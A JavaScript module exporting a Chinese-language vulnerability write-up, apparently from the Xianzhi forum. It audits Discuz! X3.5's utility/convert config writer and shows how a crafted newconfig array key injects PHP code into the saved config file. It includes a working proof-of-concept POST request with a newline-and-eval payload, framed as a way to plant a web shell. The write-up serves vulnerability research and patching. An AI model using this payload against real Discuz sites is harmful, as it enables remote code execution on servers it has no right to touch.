const n=`# \u6587\u7AE0 - Discuz!x\u2014\u20143.5\u7248\u672C\u6F0F\u6D1E\u590D\u73B0&\u4EE3\u7801\u5BA1\u8BA1  - \u5148\u77E5\u793E\u533A

Created: March 26, 2025 11:54 AM
URL: https://xz.aliyun.com/news/15882
\u6587\u7AE0\u4E8C\u7EA7\u7C7B\u522B: 0Day\u6316\u6398-\u6CE8\u610F\u56FE\u7247\u624B\u52A8\u62D6\u8FDB\u6765
\u6587\u7AE0\u7C7B\u522B(\u6839\u636EWebStorm\u7684\u76EE\u5F55\u6765): \u4EE3\u7801\u5BA1\u8BA1

## \u4E00\u3001\u73AF\u5883\u51C6\u5907

\u4E0B\u8F7D\u6E90\u7801

\`\`\`
https://gitee.com/Discuz/DiscuzX/attach_files
\`\`\`

![](https://xzfile.aliyuncs.com/media/upload/picture/20241128214835-76d29a2a-ad8f-1.png)

\u538B\u7F29\u5305\u91CC\u9762\u7684utility\u4E5F\u53EF\u4EE5\u4E0B\u8F7D

![](https://xzfile.aliyuncs.com/media/upload/picture/20241128214858-84a23bc4-ad8f-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241128214910-8b86b30c-ad8f-1.png)

## \u4E8C\u3001\u5BA1\u8BA1

\u53D1\u73B0\u5728
\\Discuz_X3.5_SC_UTF8_20240520\\X3.5_utility_20230210\\convert\\index.php

\u8FD9\u4E2Aphp\u6587\u4EF6\u91CC\u9762\u6709\u5927\u91CF\u7684\u6587\u4EF6\u5305\u542B

![](https://xzfile.aliyuncs.com/media/upload/picture/20241128214922-9290e956-ad8f-1.png)

\u540C\u65F6\u8FD9\u4E2A$action\u53D8\u91CF\u662F\u53EF\u63A7\u7684

![](https://xzfile.aliyuncs.com/media/upload/picture/20241128214953-a575e5e4-ad8f-1.png)

\u5176\u5B9E\u5C31\u70B9\u51FB\u8FD9\u4E2A\u4FEE\u6539

php\u4EE3\u7801\u8C03\u8BD5

![](https://xzfile.aliyuncs.com/media/upload/picture/20241128215010-af6a08fa-ad8f-1.png)

\u7528bp\u6293\u5305

![](https://xzfile.aliyuncs.com/media/upload/picture/20241128215022-b65aa08e-ad8f-1.png)

post\u8BF7\u6C42\u5176\u5B9E\u5C31\u662F

\`\`\`
a=setting&source=d7.2_x1.0&submit=yes&newconfig[source][dbhost]=localhost&newconfig[source][dbuser]=root&newconfig[source][dbpw]=&newconfig[source][dbname]=discuz&newconfig[source][tablepre]=cdb_&newconfig[source][dbcharset]=&newconfig[source][pconnect]=1&newconfig[target][dbhost]=localhost&newconfig[target][dbuser]=root&newconfig[target][dbpw]=&newconfig[target][dbname]=discuzx&newconfig[target][tablepre]=pre_&newconfig[target][dbcharset]=&newconfig[target][pconnect]=1&submit=
\`\`\`

\u6211\u4EEC\u628A\u56DB\u4E2A\u6587\u4EF6\u90FD\u770B\u4E00\u6B21

### do_source.inc.php

![](https://xzfile.aliyuncs.com/media/upload/picture/20241128215035-bdef6a50-ad8f-1.png)

\u5176\u5B9E\u5C31\u662F\u5C55\u793A\u4E86\u9996\u9875

![](https://xzfile.aliyuncs.com/media/upload/picture/20241128215047-c54f063e-ad8f-1.png)

### do_config.inc.php

\u8FD9\u4E2A\u5C31\u662F\u70B9\u51FB\u201C\u5F00\u59CB\u201D\u9009\u9879\u5C31\u53EF\u4EE5\u8FDB\u5165\u8FD9\u4E2A\u6587\u4EF6do_config.inc.php

![](https://xzfile.aliyuncs.com/media/upload/picture/20241128215102-ce71249a-ad8f-1.png)

\u53D1\u73B0\u4E86\u4E00\u4E2A\u51FD\u6570\u4FDD\u5B58\u6587\u4EF6\u7684\uFF0C\u770B\u6587\u4EF6\u540D\u5E94\u8BE5\u662F\u539F\u610F\u662F\u4FDD\u5B58\u914D\u7F6E\u6587\u4EF6\u5185\u5BB9\u5199\u5165\u4E4B\u7C7B\u7684\uFF0C\u4F46\u662F\u53D1\u73B0$newconfig\u53C2\u6570\u53EF\u63A7\uFF0C\u540C\u65F6\u4E5F\u662F\u4F5C\u4E3A\u5185\u5BB9\u4F20\u5165

\u4E8E\u662F\u5C31\u60F3\u5230\u662F\u5426\u80FD\u591F\u8FDB\u884C\u6587\u4EF6\u5199\u5165\u6728\u9A6C\u5462\uFF1F

\u8BE5\u51FD\u6570\u7684\u6E90\u7801

\`\`\`
function save_config_file($filename, $config, $default) {
    $config = setdefault($config, $default);
    $date = gmdate("Y-m-d H:i:s", time() + 3600 * 8);
    $year = date('Y');
    $content = <<<EOT
<?php
\\$_config = array();
EOT;
    $content .= getvars(array('_config' => $config));
    $content .= "\\r\\n// ".str_pad('  THE END  ', 50, '-', STR_PAD_BOTH)." //\\r\\n\\r\\n?>";
    file_put_contents($filename, $content);
}
\`\`\`

\u7531\u4E8E$config\u5C31\u662F$newconfig\u7684\u503C\u7ECF\u8FC7setdefault\u65B9\u6CD5\u540E\u4F20\u5165\u7684\uFF0C

\u6240\u4EE5\u8FD9\u4E2Acontent\u662F\u53EF\u63A7\u7684\u3002

\u5B83\u8C03\u7528\u4E86setdefault\u65B9\u6CD5

\`\`\`
function setdefault($var, $default) {
    foreach ($default as $k => $v) {
        if(!isset($var[$k])) {
            $var[$k] = $default[$k];
        } elseif(is_array($v)) {
            $var[$k] = setdefault($var[$k], $default[$k]);
        }
    }
    return $var;
}
\`\`\`

$default\u662Fconfig.default.php\u4E2D\u7684\u952E\u503C\u5BF9\u4F20\u5165\u7684\uFF0C\u5176\u5B9E\u539F\u610F\u5C31\u662F\u6309\u7167\u9ED8\u8BA4\u7684\u6A21\u677F\u6765\u8FDB\u884C\u952E\u503C\u5BF9\u8D4B\u503C

config.default.php\u6587\u4EF6

![](https://xzfile.aliyuncs.com/media/upload/picture/20241128215118-d7b23ea4-ad8f-1.png)

\u90A3\u4E48\u4E0D\u5C31\u662F\u53D6\u952E\u503C\u5BF9\u7684\u610F\u601D\u5417\uFF1F

\u5176\u5B9E\u5C31\u662F$config=$newconfig+config.default.php\u6587\u4EF6\u4E2D\u5BF9\u5E94\u9879\u7684\u8865\u5145

\`\`\`
\u800Cpost\u4F20\u53C2\u662F\uFF1A
a=config&source=d7.2_x1.0&submit=yes&newconfig[source][dbhost]=localhost&newconfig[source][dbuser]=root&newconfig[source][dbpw]=&newconfig[source][dbname]=discuz&newconfig[source][tablepre]=cdb_&newconfig[source][dbcharset]=&newconfig[source][pconnect]=1&newconfig[target][dbhost]=localhost&newconfig[target][dbuser]=root&newconfig[target][dbpw]=&newconfig[target][dbname]=discuzx&newconfig[target][tablepre]=pre_&newconfig[target][dbcharset]=&newconfig[target][pconnect]=1&submit=
\`\`\`

\u800C\u4E14\u5728do_config.inc.php\u6587\u4EF6\u4E2D\u6709\u4E0B\u9762\u8FD9\u4E9B\u4EE3\u7801

\`\`\`
if(submitcheck()) {
    $newconfig = getgpc('newconfig');
    if(is_array($newconfig)) {
        $checkarray = $setting['config']['ucenter'] ? array('source', 'target', 'ucenter') : array('source', 'target');
        foreach ($checkarray as $key) {
            if(!empty($newconfig[$key]['dbhost'])) {
                $check = mysql_connect_test($newconfig[$key], $key);
                if($check < 0) {
                    $error[$key] = lang('mysql_connect_error_'.abs($check));
                }
            } else {
                $error[$key] = lang('mysql_config_error');
            }
        }
        save_config_file($configfile, $newconfig, $config_default);
        if(empty($error)) {
            $db_target = new db_mysql($newconfig['target']);
            $db_target->connect();
            delete_process('all');
            showmessage('config_success', 'index.php?a=select&source='.$source);
        }
    }
}
\`\`\`

\u8FD9\u4E2Aif\u5176\u5B9E\u5C31\u662F\u6821\u9A8C\u4E86\u662F\u5426\u4E3Apost\u4F20\u53C2\uFF0C\u540C\u65F6\u662F\u5426\u6709submit

\`\`\`
function submitcheck($var = 'submit', $allowget = false) {
    $check = getgpc($var);
    $ret = false;
    if(empty($check)) {
    } elseif($allowget) {
        $ret = true;
    } elseif($_REQUEST['method'] == 'post') {
        $ret = true;
    }
    return $ret;
}
\`\`\`

\u90A3\u4E48\u6211\u4EEC\u53EA\u8981\u662Fpost\u4F20\u53C2\uFF0C\u540C\u65F6\u6709submit\u5C31\u8FDB\u5165\u8FD9\u4E2Aif

\u63A5\u7740\u4ED6\u8FD8\u5224\u65AD$newconfig\u662F\u5426\u4E3A\u6570\u7EC4

![](https://xzfile.aliyuncs.com/media/upload/picture/20241128215139-e4647072-ad8f-1.png)

\u4E2D\u95F4\u7EA2\u6846\u8FD9\u6BB5\u53EF\u4EE5\u4E0D\u7528\u7406\u4F1A\uFF0C\u5176\u5B9E\u5C31\u662F\u6570\u636E\u5E93\u914D\u7F6E\u4E4B\u7C7B\u7684\uFF0C\u4E0D\u4F1A\u5F71\u54CD\u8D70\u5165save_config_file\u51FD\u6570

\u7531\u4E8Esave_config_file\u51FD\u6570\u540E\u9762\u8C03\u7528\u4E00\u4E2Agetvars\u51FD\u6570

![](https://xzfile.aliyuncs.com/media/upload/picture/20241128215251-0f346316-ad90-1.png)

\u8FD9\u91CC\u7684$key\u5176\u5B9E\u5C31\u662F\u6211\u4EEC\u4F20\u5165newconfig[key]=shushu\u7684\u952Ekey\u5982\u679C\u6211\u4EEC\u52A0\u5165\u4E86eval\u7B49\u6076\u610F\u5B57\u7B26\u90A3\u4E48\u5C31\u53EF\u4EE5\u6210\u529F\u5199\u9A6C

\u7531\u4E8E\u8C03\u7528getvars\u4F20\u5165\u7684\u662F\u4E00\u4E2A\u6570\u7EC4array('_config' => $config)\u6240\u4EE5\u4E00\u5B9A\u56DE\u8D70\u5230is_array($val)\u91CC\u9762\u7136\u540E\u8C03\u7528buildarray\u65B9\u6CD5

\`\`\`
function getvars($data, $type = 'VAR') {
    $evaluate = '';
    foreach($data as $key => $val) {
        if(!preg_match("/^[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*$/", $key)) {
            continue;
        }
        if(is_array($val)) {
            $evaluate .= buildarray($val, 0, "\\\${$key}")."\\r\\n";
        } else {
            $val = addcslashes($val, '\\'\\\\');
            $evaluate .= $type == 'VAR' ? "\\$$key = '$val';\\n" : "define('".strtoupper($key)."', '$val');\\n";
        }
    }
    return $evaluate;
}
function buildarray($array, $level = 0, $pre = '$_config') {
    static $ks;
    if($level == 0) {
        $ks = array();
        $return = '';
    }
    foreach ($array as $key => $val) {
        if(!preg_match("/^[a-zA-Z0-9_\\x7f-\\xff]+$/", $key)) {
            continue;
        }
        if($level == 0) {
            $newline = str_pad('  CONFIG '.strtoupper($key).'  ', 50, '-', STR_PAD_BOTH);
            $return .= "\\r\\n// $newline //\\r\\n";
        }
        $ks[$level] = $ks[$level - 1]."['$key']";
        if(is_array($val)) {
            $ks[$level] = $ks[$level - 1]."['$key']";
            $return .= buildarray($val, $level + 1, $pre);
        } else {
            $val = !is_array($val) && (!preg_match("/^\\-?[1-9]\\d*$/", $val) || strlen($val) > 12) ? '\\''.addcslashes($val, '\\'\\\\').'\\'' : $val;
            $return .= $pre.$ks[$level - 1]."['$key']"." = $val;\\r\\n";
        }
    }
    return $return;
}
\`\`\`

\u8FD9\u4E2Agetvars\u8FD8\u8C03\u7528\u4E86\u4E00\u4E2Abuildarray\u51FD\u6570\uFF0C\u5176\u5B9E\u4E5F\u5C31\u662F\u952E\u503C\u5BF9\u53D6\u503C\u800C\u5DF2

\u4F20\u5165buildarray\u51FD\u6570\u5176\u5B9E\u5C31\u662F\u4F20\u4E86\u4E00\u4E2A\u6570\u7EC4

\u7136\u540E\u5C31\u662F\u8D70\u5230\u4E86

\`\`\`
if($level == 0) {
            $newline = str_pad('  CONFIG '.strtoupper($key).'  ', 50, '-', STR_PAD_BOTH);
            $return .= "\\r\\n// $newline //\\r\\n";
        }
\`\`\`

\u8FD9\u91CC\u8FD9\u4E2Astr_pad\u51FD\u6570\u539F\u672C\u662F\u4F5C\u4E3A\u5206\u9694\u7B26\u7684
\u6BD4\u5982\u8BF4\u662F

\`\`\`
'-------  CONFIG EXAMPLE  -------'
\`\`\`

\u7EA2\u6846\u5708\u4F4F\u7684\u5185\u5BB9\uFF1A

![](https://xzfile.aliyuncs.com/media/upload/picture/20241128215227-00cdde9c-ad90-1.png)

\u4F46\u662F\u7531\u4E8E\u8FD9\u4E2A$key\u662F\u53EF\u63A7\u7684\uFF0C\u90A3\u4E48\u5C31\u4F1A\u5BFC\u81F4\u6211\u4EEC\u7528\u6362\u884C\u7B26\u53F7\u6362\u884C\uFF0C\u7136\u540E\u7528\u6CE8\u91CA\u7B26\u53F7\u6CE8\u91CA\u6389\u540E\u95E8\u7684\u5185\u5BB9\u9632\u6B62\u62A5\u9519\uFF0C\u4E2D\u95F4\u5C31\u53EF\u4EE5\u5199\u5165\u6211\u4EEC\u7684\u6076\u610F\u4EE3\u7801\u4E86

\u6700\u540E\u5C31\u662F$config=$newconfig+config.default.php\u6587\u4EF6\u4E2D\u5BF9\u5E94\u9879\u7684\u8865\u5145

\`\`\`
$content .= getvars(array('_config' => $config));
    $content .= "\\r\\n// ".str_pad('  THE END  ', 50, '-', STR_PAD_BOTH)." //\\r\\n\\r\\n?>";
    file_put_contents($filename, $content);
\`\`\`

\u6700\u540E\u901A\u8FC7\u63A7\u5236$config\u7684\u503C\u6765\u8FBE\u5230\u5199\u5165\u6076\u610F\u5B57\u7B26\uFF0C

\u4F46\u662F\u597D\u50CF\u5E76\u6CA1\u6709\u5BF9key\u53D8\u91CF\u7684\u6076\u610F\u5B57\u7B26\u8FDB\u884C\u68C0\u6D4B

## \u4E09\u3001\u9A8C\u8BC1

\u90A3\u4E48\u6211\u4EEC\u7684payload\u53D8\u6210

\`\`\`
post\u4F20\u53C2
a=config&source=d7.2_x1.5&submit=yes&newconfig[%0a%0deval(phpinfo());//]=shushu
\`\`\`

\u53D1\u5305

\`\`\`
POST /utility/convert/index.php HTTP/1.1
Host: discuz.com:65533
Content-Length: 79
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
a=config&source=d7.2_x1.5&submit=yes&newconfig[%0a%0deval(phpinfo());//]=shushu
\`\`\`

![](https://xzfile.aliyuncs.com/media/upload/picture/20241128215211-f7aabaec-ad8f-1.png)

\u6210\u529F\u5199\u5165

![](https://xzfile.aliyuncs.com/media/upload/picture/20241128215158-efb3f218-ad8f-1.png)

\u6700\u540E\u6210\u529F\u5199\u5165

## \u56DB\u3001\u5C0F\u7ED3

\\utility\\convert\\index.php\u6587\u4EF6\u4E0B\u7684action\u53EF\u4EE5\u8C03\u7528./include/do_config.inc.php

\u7136\u540E\u8C03\u7528\u4E86\u91CC\u9762\u7684save_config_file\u65B9\u6CD5\u5199\u5165\u6587\u4EF6\u3002`;export{n as _};
